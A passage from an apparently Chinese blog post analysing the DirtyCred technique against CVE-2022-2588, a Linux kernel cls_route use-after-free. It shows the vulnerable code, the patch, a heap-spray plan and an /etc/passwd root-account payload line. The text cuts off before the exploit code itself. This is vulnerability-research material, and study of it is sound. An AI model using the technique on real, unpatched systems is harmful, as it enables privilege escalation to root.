class="number">-128</span>       <span class="number">640</span>    <span class="number">640</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-96</span>        <span class="number">672</span>    <span class="number">672</span>     <span class="number">96</span>   <span class="number">42</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-64</span>       <span class="number">2112</span>   <span class="number">2112</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-32</span>       <span class="number">2048</span>   <span class="number">2048</span>     <span class="number">32</span>  <span class="number">128</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-16</span>       <span class="number">4608</span>   <span class="number">4608</span>     <span class="number">16</span>  <span class="number">256</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc-cg<span class="number">-8</span>        <span class="number">8192</span>   <span class="number">8192</span>      <span class="number">8</span>  <span class="number">512</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-8</span>k           <span class="number">244</span>    <span class="number">244</span>   <span class="number">8192</span>    <span class="number">4</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-4</span>k          <span class="number">1860</span>   <span class="number">1872</span>   <span class="number">4096</span>    <span class="number">8</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-2</span>k          <span class="number">2384</span>   <span class="number">2384</span>   <span class="number">2048</span>   <span class="number">16</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-1</span>k          <span class="number">2968</span>   <span class="number">3008</span>   <span class="number">1024</span>   <span class="number">32</span>    <span class="number">8</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-512</span>        <span class="number">52767</span>  <span class="number">52768</span>    <span class="number">512</span>   <span class="number">32</span>    <span class="number">4</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-256</span>         <span class="number">8879</span>   <span class="number">8960</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-192</span>         <span class="number">3486</span>   <span class="number">3486</span>    <span class="number">192</span>   <span class="number">42</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-128</span>         <span class="number">3419</span>   <span class="number">3424</span>    <span class="number">128</span>   <span class="number">32</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-96</span>          <span class="number">5482</span>   <span class="number">5754</span>     <span class="number">96</span>   <span class="number">42</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-64</span>         <span class="number">18368</span>  <span class="number">18368</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-32</span>         <span class="number">33152</span>  <span class="number">33152</span>     <span class="number">32</span>  <span class="number">128</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-16</span>         <span class="number">16640</span>  <span class="number">16640</span>     <span class="number">16</span>  <span class="number">256</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmalloc<span class="number">-8</span>          <span class="number">15872</span>  <span class="number">15872</span>      <span class="number">8</span>  <span class="number">512</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmem_cache_node      <span class="number">576</span>    <span class="number">576</span>     <span class="number">64</span>   <span class="number">64</span>    <span class="number">1</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br><span class="line">kmem_cache           <span class="number">384</span>    <span class="number">384</span>    <span class="number">256</span>   <span class="number">32</span>    <span class="number">2</span> : tunables    <span class="number">0</span>    <span class="number">0</span>    <span class="number">0</span> : sl0</span><br></pre></td></tr></table></figure>
<ul>
<li><code>generic cache</code>：在名称中带有 <code>kmalloc</code></li>
<li><code>dedicated cache</code>：拥有特殊的名字</li>
</ul>
<p><strong>Dirty Cred 漏洞利用</strong></p>
<p>大致步骤：</p>
<ul>
<li>释放存在漏洞的非特权凭据</li>
<li>在释放的内存插槽中分配特权凭据</li>
<li>以特权用户身份操作</li>
</ul>
<p>具体步骤：（本例是采用 <code>file</code> 对象完成利用，也可以采用 <code>cred</code> 对象）</p>
<ul>
<li>打开可写的文件 <code>/tmp/x</code>，就会分配可写的 <code>file</code> 对象，在通过写许可检查之后后，进行实际写操作之前暂停</li>
<li>利用漏洞释放该 <code>file</code> 对象</li>
<li>打开只读文件 <code>/etc/passwd</code>，就会分配新的 <code>file</code> 对象，占据旧的 <code>file</code> 对象，继续写入就能往只读文件写入内容（例如写入 <code>hacker:x:0:0:root:/:/bin/sh</code> 就能提权）</li>
</ul>
<p>CVE-2022-2588 漏洞点：</p>
<ul>
<li>将 <code>route4_filter</code> 对象从链表中删除和释放时的检查条件不一致</li>
<li>导致该对象被释放后仍存于链表中</li>
</ul>
<p>安装 Kernel：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.19.1.tar.xz</span><br><span class="line">tar -xvf linux-5.19.1.tar.xz</span><br><span class="line">make menuconfig</span><br><span class="line">make x86_64_defconfig</span><br><span class="line">make bzImage -j32</span><br></pre></td></tr></table></figure>
<ul>
<li>怕麻烦的可以在如下网站中下载：<a target="_blank" rel="noopener" href="https://github.com/bsauce/kernel-exploit-factory/tree/main/CVE-2022-2588">kernel-exploit-factory/CVE-2022-2588 at main · bsauce/kernel-exploit-factory (github.com)</a> </li>
</ul>
<p>编译选项：</p>
<ul>
<li><strong>CONFIG_BINFMT_MISC=y</strong> （否则启动VM时报错）</li>
<li><strong>CONFIG_USER_NS=y</strong> （触发漏洞需要 User Namespace）</li>
<li><strong>CONFIG_NET_CLS_ROUTE4=y</strong> （漏洞函数所在的模块）</li>
<li><strong>CONFIG_DUMMY=y</strong> <strong>CONFIG_NET_SCH_QFQ=y</strong> （breezeO_o 提供的两个编译选项，触发 poc 需要用到）</li>
<li><strong>CONFIG_NET_CLS_ACT=y</strong> / <strong>CONFIG_NET_CLS_BASIC=y</strong> （默认已开启）</li>
<li><strong>CONFIG_NET_SCH_SFQ=y</strong> （exp 中触发漏洞需用到 sfq 随机公平队列）</li>
<li><strong>CONFIG_NET_EMATCH_META=y</strong> （exp 中堆喷对象时需要用到）</li>
</ul>
<p>Dirty Cred 所面对的挑战：</p>
<ol>
<li>如何将内存破坏漏洞，转换为能够置换 <code>file object</code> 的原语</li>
<li>如何延长文件的 权限检查-数据写入 的竞争窗口</li>
<li>如何创建高权限的 <code>file object</code>，来占据先前被释放的低权限 <code>file object</code> 内存空洞</li>
</ol>
<p>对应的解决措施：</p>
<ol>
<li>置换 <code>file object</code>：<ul>
<li>Out Of Bound Write：尝试越界写入下一个结构体的凭证字段，将其替换为高权限的凭证（例如：<code>request_key_auth-&gt;cred</code>）</li>
<li>Use After Free：使用高权限的凭证来“占据”低权限的凭证</li>
<li>Double Free：最终可以达到两个指针共同指向一个凭证的效果 </li>
</ul>
</li>
<li>延长竞争窗口：<ul>
<li>Userfaultfd：在多线程程序中，userfaultfd 允许一个线程管理其他线程所产生的 Page Fault 事件，当某个线程触发了 Page Fault，该线程将立即睡眠，而其他线程则可以通过 userfaultfd 来读取出这个 Page Fault 事件，并进行处理</li>
<li>FUSE：一个用户层文件系统框架，允许用户实现自己的文件系统，用户可以在该框架中注册 handler，来指定应对文件操作请求（可以在实际操作文件之前，执行 handler 暂停内核执行，尽可能地延长窗口）</li>
<li>File Lock：使用锁定暂停内核执行</li>
</ul>
</li>
<li>分配特权对象：<ul>
<li>大量执行 Set-UID 程序（例如 sudo），或者频繁创建特权级守护进程（例如 sshd），从而创建 privilege cred 结构体</li>
<li>使用 ReadOnly 方式来打开诸如 <code>/etc/passwd</code> 等特权文件</li>
<li>当内核创建新的 <code>kernel thread</code> 时，当前 <code>kernel thread</code> 将会被复制，于此同时其 <code>privileged cred</code> 结构体也会被拷贝一份</li>
</ul>
</li>
</ol>
<p>接下来看一看关键的代码：</p>
<ul>
<li><code>route4_filter</code> 对象：（大小为“144”，属于 <code>kmalloc-192</code> ）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> __<span class="title">rcu</span>	*<span class="title">next</span>;</span></span><br><span class="line">	u32			id;</span><br><span class="line">	<span class="keyword">int</span>			iif;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_result</span>	<span class="title">res</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_exts</span>		<span class="title">exts</span>;</span></span><br><span class="line">	u32			handle;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span>	*<span class="title">bkt</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto</span>	*<span class="title">tp</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_work</span>		<span class="title">rwork</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>tcf_exts</code> 对象的 <code>tc_action</code> 条目：（包含32个 <code>tc_action</code> 对象指针，属于 <code>kmalloc-256</code>）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcf_exts</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NET_CLS_ACT</span></span><br><span class="line">	__u32	type; <span class="comment">/* for backward compat(TCA_OLD_COMPAT) */</span></span><br><span class="line">	<span class="keyword">int</span> nr_actions;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tc_action</span> **<span class="title">actions</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* Map to export classifier specific extension TLV types to the</span></span><br><span class="line"><span class="comment">	 * generic extensions API. Unsupported extensions must be set to 0.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> action;</span><br><span class="line">	<span class="keyword">int</span> police;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>有漏洞的代码：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">route4_change</span><span class="params">(struct net *net, struct sk_buff *in_skb,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct tcf_proto *tp, <span class="keyword">unsigned</span> <span class="keyword">long</span> base, u32 handle,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct nlattr **tca, <span class="keyword">void</span> **arg, <span class="keyword">bool</span> ovr,</span></span></span><br><span class="line"><span class="params"><span class="function">			 <span class="keyword">bool</span> rtnl_held, struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> *<span class="title">head</span> =</span> rtnl_dereference(tp-&gt;root);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> __<span class="title">rcu</span> **<span class="title">fp</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">fold</span>, *<span class="title">f1</span>, *<span class="title">pfp</span>, *<span class="title">f</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> *<span class="title">b</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">opt</span> =</span> tca[TCA_OPTIONS];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tb</span>[<span class="title">TCA_ROUTE4_MAX</span> + 1];</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> h, th;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="keyword">bool</span> <span class="keyword">new</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (opt == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> handle ? -EINVAL : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	err = nla_parse_nested_deprecated(tb, TCA_ROUTE4_MAX, opt,</span><br><span class="line">					  route4_policy, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	fold = *arg; <span class="comment">/* 现有的route4_filter对象 */</span></span><br><span class="line">	<span class="keyword">if</span> (fold &amp;&amp; handle &amp;&amp; fold-&gt;handle != handle)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	err = -ENOBUFS;</span><br><span class="line">	f = kzalloc(<span class="keyword">sizeof</span>(struct route4_filter), GFP_KERNEL); <span class="comment">/* 分配新的route4_filter对象 */</span></span><br><span class="line">	<span class="keyword">if</span> (!f)</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">	err = tcf_exts_init(&amp;f-&gt;exts, net, TCA_ROUTE4_ACT, TCA_ROUTE4_POLICE); <span class="comment">/* 进行初始化,为route4_filter-&gt;exts.action分配256字节的空间 */</span></span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fold) &#123; <span class="comment">/* 把旧的route4_filter对象中的数据填入新的route4_filter对象 */</span></span><br><span class="line">		f-&gt;id = fold-&gt;id;</span><br><span class="line">		f-&gt;iif = fold-&gt;iif;</span><br><span class="line">		f-&gt;res = fold-&gt;res;</span><br><span class="line">		f-&gt;handle = fold-&gt;handle;</span><br><span class="line"></span><br><span class="line">		f-&gt;tp = fold-&gt;tp;</span><br><span class="line">		f-&gt;bkt = fold-&gt;bkt;</span><br><span class="line">		<span class="keyword">new</span> = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = route4_set_parms(net, tp, base, f, handle, head, tb,</span><br><span class="line">			       tca[TCA_RATE], <span class="keyword">new</span>, ovr, extack); <span class="comment">/* 初始化new filter */</span></span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 将new filter插入到list */</span></span><br><span class="line">	h = from_hash(f-&gt;handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line">	fp = &amp;f-&gt;bkt-&gt;ht[h];</span><br><span class="line">	<span class="keyword">for</span> (pfp = rtnl_dereference(*fp);</span><br><span class="line">         (f1 = rtnl_dereference(*fp)) != <span class="literal">NULL</span>;</span><br><span class="line">         fp = &amp;f1-&gt;next)</span><br><span class="line">		<span class="keyword">if</span> (f-&gt;handle &lt; f1-&gt;handle)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	tcf_block_netif_keep_dst(tp-&gt;chain-&gt;block);</span><br><span class="line">	rcu_assign_pointer(f-&gt;next, f1);</span><br><span class="line">	rcu_assign_pointer(*fp, f);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 若存在old filter,old handle不为&quot;0&quot;,old new handle不同,则从list中移除 */</span></span><br><span class="line">	<span class="keyword">if</span> (fold &amp;&amp; fold-&gt;handle &amp;&amp; f-&gt;handle != fold-&gt;handle) &#123;</span><br><span class="line">		th = to_hash(fold-&gt;handle);</span><br><span class="line">		h = from_hash(fold-&gt;handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line">		b = rtnl_dereference(head-&gt;table[th]);</span><br><span class="line">		<span class="keyword">if</span> (b) &#123;</span><br><span class="line">			fp = &amp;b-&gt;ht[h]; <span class="comment">/* ht存放的是route4_filter列表 */</span></span><br><span class="line">			<span class="keyword">for</span> (pfp = rtnl_dereference(*fp); pfp;</span><br><span class="line">			     fp = &amp;pfp-&gt;next, pfp = rtnl_dereference(*fp)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (pfp == fold) &#123;</span><br><span class="line">					rcu_assign_pointer(*fp, fold-&gt;next); <span class="comment">/* 从链表中删除 */</span></span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	route4_reset_fastmap(head);</span><br><span class="line">	*arg = f;</span><br><span class="line">	<span class="keyword">if</span> (fold) &#123; <span class="comment">/* 若存在old filter,释放old filter */</span></span><br><span class="line">		tcf_unbind_filter(tp, &amp;fold-&gt;res);</span><br><span class="line">		tcf_exts_get_net(&amp;fold-&gt;exts);</span><br><span class="line">		tcf_queue_work(&amp;fold-&gt;rwork, route4_delete_filter_work); <span class="comment">/* 启动内核任务,调用route4_delete_filter_work释放old filter */</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">errout:</span><br><span class="line">	<span class="keyword">if</span> (f)</span><br><span class="line">		tcf_exts_destroy(&amp;f-&gt;exts);</span><br><span class="line">	kfree(f);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 <code>handle</code> 作为 ID 来区分不同的 <code>route4_filter</code></li>
<li>如果存在某个 <code>handle</code> 之前已被初始化过（<code>fold</code> 变量非空），就会移除旧的 <code>filter</code>，添加新的 <code>filter</code></li>
<li>否则直接添加新的 <code>filter</code></li>
</ul>
<p>这里可以发现，将 <code>route4_filter</code> 对象从链表中删除和释放时的检查条件不一致：</p>
<ul>
<li>从链表中删除的条件：<ul>
<li>存在 <code>old filter</code></li>
<li><code>old handle</code> 不为 “0”</li>
<li><code>old new handle</code> 不同</li>
</ul>
</li>
<li>从链表中释放的条件：<ul>
<li>存在 <code>old filter</code></li>
</ul>
</li>
</ul>
<p>如果 <code>old handle == 0</code>，则不会在链表中删除但是会被释放，这就导致了一个 UAF</p>
<p>漏洞利用的思路为：</p>
<p><strong>cross-cache</strong>：我们将释放某个 <code>kmalloc-256 cache page</code>，将该页归还给页管理器，然后分配 <code>file</code> 结构来复用该页（<code>filp cache</code>）</p>
<ul>
<li>分配一堆 <code>kmalloc-256</code> 堆块，包含漏洞对象</li>
<li>利用漏洞第1次释放漏洞对象，并释放一堆 <code>kmalloc-256</code>，以归还漏洞对象所在的页</li>
<li>分配大量低权限 <code>file</code> 对象来占据漏洞对象（cross-cache attack）</li>
<li>利用漏洞第2次释放漏洞对象（低权限 <code>file</code> 对象被释放）</li>
<li>堆喷高权限 <code>file</code> 对象来替换低权限 <code>file</code> 对象</li>
<li>利用 UAF 控制高权限 <code>file</code> 对象</li>
</ul>
<p>补丁：</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/net/sched/cls_route.c b/net/sched/cls_route.c</span></span><br><span class="line"><span class="comment">index a35ab8c27866e..3f935cbbaff66 100644</span></span><br><span class="line"><span class="comment">--- a/net/sched/cls_route.c</span></span><br><span class="line"><span class="comment">+++ b/net/sched/cls_route.c</span></span><br><span class="line"><span class="meta">@@ -526,7 +526,7 @@</span> static int route4_change(struct net *net, struct sk_buff *in_skb,</span><br><span class="line">    rcu_assign_pointer(f-&gt;next, f1);</span><br><span class="line">    rcu_assign_pointer(*fp, f);</span><br><span class="line"></span><br><span class="line"><span class="deletion">-   if (fold &amp;&amp; fold-&gt;handle &amp;&amp; f-&gt;handle != fold-&gt;handle) &#123;</span></span><br><span class="line"><span class="addition">+   if (fold) &#123;</span></span><br><span class="line">        th = to_hash(fold-&gt;handle);</span><br><span class="line">        h = from_hash(fold-&gt;handle &gt;&gt; 16);</span><br><span class="line">        b = rtnl_dereference(head-&gt;table[th]);</span><br></pre></td></tr></table></figure>
<p><strong>Dirty Cred 漏洞复现</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>进程1</th>
<th>进程2</th>
</tr>
</thead>
<tbody>
<tr>
<td>0. 绑定到 CPU 0 上运行，设置子进程内存、工作目录、Namespace，启动进程2</td>
<td></td>
</tr>
<tr>
<td>1. 去碎片化，打开10000个文件，消耗 filp cache，为 cross-cache 作准备</td>
<td></td>
</tr>
<tr>
<td>2. 喷射 (middle+3)*32 kmalloc-192 &amp; kmalloc-256（和漏洞对象位于同一cache，便于进行 cross-cache 被 file 对象复用）</td>
<td></td>
</tr>
<tr>
<td></td>
<td>3. 分配1个 route4_filter 漏洞对象，还有1个kmalloc-256 的漏洞对象</td>
</tr>
<tr>
<td>4. 再喷射 (end-middle-2)*32 kmalloc-192 &amp; kmalloc-256</td>
<td></td>
</tr>
<tr>
<td>5. 释放 (end-24)*32 kmalloc-192 &amp; kmalloc-256</td>
<td></td>
</tr>
<tr>
<td></td>
<td>6. 第1次释放漏洞对象 kmalloc-192 &amp; kmalloc-256</td>
</tr>
<tr>
<td>7. 释放 (end-middle+1) kmalloc-192 &amp; kmalloc-256（避免连续释放同一对象，触发内核 double-free 的检测）</td>
<td></td>
</tr>
<tr>
<td></td>
<td>8. 喷射 4000 个低权限 file 对象（通过打开 exp_dir/data 文件）</td>
</tr>
<tr>
<td></td>
<td>9. 第2次释放漏洞对象 kmalloc-192 &amp; kmalloc-256</td>
</tr>
<tr>
<td></td>
<td>10. 喷射 5000 个低权限 file 对象，采用 kcmp 调用检查是否和前 4000 个 file 重合，重合的两个 file 记为 overlap_a / overlap_b</td>
</tr>
<tr>
<td></td>
<td>11. 发起3个利用线程，线程1写入大量数据来占用文件锁，线程2往 overlap_a 写入恶意数据</td>
</tr>
<tr>
<td>12. 线程3关闭 overlap_a / overlap_b，喷射 4096*2 个高权限 file 对象（通过打开 /etc/passwd 文件），未区分CPU</td>
<td></td>
</tr>
<tr>
<td></td>
<td>13. 最后检查 /etc/passwd 文件是否被写入恶意数据</td>
</tr>
</tbody>
</table>
</div>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span 